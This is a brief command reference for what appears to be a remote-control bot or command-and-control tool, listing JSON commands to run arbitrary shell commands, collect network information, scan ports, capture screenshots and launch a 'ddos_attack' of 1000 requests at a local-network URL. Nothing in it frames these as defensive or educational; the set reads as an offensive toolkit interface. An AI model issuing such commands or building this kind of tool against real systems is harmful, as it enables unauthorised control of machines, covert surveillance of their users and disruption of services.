# Command Overview

### 1. **Execute Bash Command**
```json
{
    "command": "execute_bash_command",
    "requirements": [],
    "bash_command": "dir"
}
```

### 2. **Network Information**
```json
{
    "command": "network_info",
    "requirements": ["psutil"]
}
```

### 3. **Port Scan**
```json
{
    "command": "port_scan",
    "requirements": []
}
```

### 4. **Take Screenshot**
```json
{
    "command": "take_screenshot",
    "requirements": ["Pillow"]
}
```

### 5. **DDoS Attack**
```json
{
    "command": "ddos_attack",
    "target_url": "http://192.168.129.105:8000",
    "request_count": 1000
}
```
